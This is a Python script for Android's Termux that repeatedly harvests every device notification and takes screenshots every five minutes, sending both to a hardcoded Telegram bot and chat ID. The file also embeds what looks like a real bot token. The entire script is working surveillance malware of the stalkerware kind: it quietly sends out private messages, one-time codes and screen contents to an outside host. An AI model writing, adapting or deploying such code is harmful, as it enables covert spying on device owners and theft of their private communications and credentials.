import os
import requests
import json
from datetime import datetime
import time

# Telegram Bot Configuration
BOT_TOKEN = "7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
CHAT_ID = "5928551879"

# Function to send a message to Telegram
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
    except Exception as e:
        print(f"Failed to send message: {e}")

# Function to send a file to Telegram
def send_telegram_file(file_path, caption=""):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as file:
            files = {"document": file}
            data = {"chat_id": CHAT_ID, "caption": caption}
            response = requests.post(url, data=data, files=files)
            response.raise_for_status()
    except Exception as e:
        print(f"Failed to send file: {e}")

# Function to get notifications (using Termux API)
def get_notifications():
    try:
        result = os.popen("termux-notification-list").read()
        notifications = json.loads(result)
        messages = []
        for notification in notifications:
            app_name = notification.get("packageName", "Unknown")
            title = notification.get("title", "No Title")
            text = notification.get("text", "No Content")
            messages.append(f"App: {app_name}\nTitle: {title}\nText: {text}")
        return "\n\n".join(messages)
    except Exception as e:
        print(f"Failed to get notifications: {e}")
        return "Failed to retrieve notifications."

# Function to take a screenshot (using Termux API)
def take_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = f"/sdcard/screenshot_{timestamp}.png"
        os.system(f"termux-screenshot -p {screenshot_path}")
        return screenshot_path
    except Exception as e:
        print(f"Failed to take screenshot: {e}")
        return None

# Main function
def main():
    while True:
        # Get notifications
        notifications = get_notifications()
        if notifications:
            send_telegram_message(f"Notifications:\n\n{notifications}")
        
        # Take a screenshot
        screenshot_path = take_screenshot()
        if screenshot_path and os.path.exists(screenshot_path):
            send_telegram_file(screenshot_path, caption="Screenshot captured")
        
        # Wait for a specific time before repeating (e.g., 5 minutes)
        time.sleep(300)  # 300 seconds = 5 minutes

if __name__ == "__main__":
    main()
